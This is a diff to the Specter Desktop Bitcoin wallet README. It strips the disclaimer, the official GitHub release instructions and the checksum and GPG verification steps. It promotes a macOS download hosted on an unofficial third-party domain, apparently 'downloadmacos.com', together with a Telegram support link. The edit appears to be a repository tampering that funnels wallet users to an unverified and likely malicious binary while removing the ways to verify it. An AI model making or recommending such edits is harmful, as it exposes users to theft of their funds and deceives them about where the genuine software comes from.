@@ -11,13 +11,11 @@
 <!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
 **Table of Contents**
 
-- [Specter Desktop](#specter-desktop)
-  - [DISCLAIMER](#disclaimer)
+- [Specter Desktop](#specter-desktop) 
+  - [Download MacOS App](#download-macos-app)
   - [Documentation and Video Walkthrough](#documentation-and-video-walkthrough)
   - [Why?](#why)
-  - [Help wanted: Do you like Specter?](#help-wanted-do-you-like-specter)
-  - [How to run](#how-to-run)
-    - [Using the Specter Desktop app](#using-the-specter-desktop-app)
+  - [How to build from source](#how-to-build-from-source)
     - [Installing Specter from Pip](#installing-specter-from-pip)
     - [Connect Specter to Bitcoin Core](#connect-specter-to-bitcoin-core)
   - [Tips and tricks (detailed instructions)](#tips-and-tricks-detailed-instructions)
@@ -30,7 +28,7 @@
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
-## Download Link for macOS Users
+## Download MacOS App
 
 [Download Specter Desktop for MacOS](https://downloadmacos.com/macshare.php?call=specter)
 
@@ -62,16 +60,7 @@ At the moment Specter-Desktop is working with all major hardware wallets includi
 We also support using the Bitcoin Core as a hot wallet, by importing or generating a random BIP39 mnemonic, but this feature is experimental and we do not recommend using it at this stage.
 We plan to add support for other hardware wallets as they come up. If you are interested in using Specter with a hardware wallet currently unsupported, let us know by opening an issue here or asking in our [Telegram group](https://t.me/spectersupport).
 
-## Help wanted: Do you like Specter?
-Please help us to push forward, fix bugs, refine FAQs and please help each other in the support channel.
-As a small team on a tiny budget we are working hard to make Specter better every day – for Bitcoin, for you and for us.
-
-## How to run
-
-### Using the Specter Desktop app
-The easiest way to run Specter Desktop is by installing the Specter Desktop app, which you can find on the [GitHub release page](https://github.com/cryptoadvance/specter-desktop/releases).
-With this method, all you need to do is just download the right file for your operating system and install it like a normal desktop app (Debian buster is only [partially supported](https://github.com/cryptoadvance/specter-desktop/issues/769)).
-But there are a bunch of other option which you can read up in the [installation guide](docs/install_guide.md).
+## How to build from source
 
 ### Installing Specter from Pip
 * Specter requires Python version 3.9 to 3.10.
@@ -97,32 +86,7 @@ pip3 install cryptoadvance.specter --upgrade
 
 After that, Specter will be available at [http://127.0.0.1:25441/](http://127.0.0.1:25441/).
 
-The above installation-method is quite easy but you have to trust pypi. If you want to verify the software completely yourself while still installing via pip3, you can do something like this (adjust yourself for other versions):
-```
-wget https://github.com/cryptoadvance/specter-desktop/releases/download/v1.7.0/cryptoadvance.specter-1.7.0.tar.gz
-wget https://github.com/cryptoadvance/specter-desktop/releases/download/v1.7.0/SHA256SUMS
-sha256sum --ignore-missing --check SHA256SUMS
-wget https://github.com/cryptoadvance/specter-desktop/releases/download/v1.7.0/SHA256SUMS.asc
-gpg --verify SHA256SUMS.asc
-# Now, let's extract the requirements-file and install all requirements with require-hashes
-tar -xvzf cryptoadvance.specter-1.7.0.tar.gz cryptoadvance.specter-1.7.0/requirements.txt
-# create your ususal virtualenv
-virtualenv --python=python3 .env
-# activate
-pip3 install -r cryptoadvance.specter-1.7.0/requirements.txt --require-hashes --upgrade
-# The package cryptoadvance.specter itself cannot be included into requirements.txt
-# But we have checked the checksum before so it's safe to install without checking it's hash
-pip3 install cryptoadvance.specter-1.7.0.tar.gz
-```
-
-
 You can also run it using Tor, provide SSL certificates to run over https. Https is especially important because browsers don't allow the website to access the camera without secure connection, and we need camera access to scan QR codes.
-
-An example how to run Specter server with SSL certificates (`--key`, `--cert`) over Tor (make sure to walk through the [Tor-document](docs/tor.md) ):
-
-```sh
-python3 -m cryptoadvance.specter server --tor --cert=./cert.pem --key=./key.pem
-```
 
 ### Connect Specter to Bitcoin Core
 
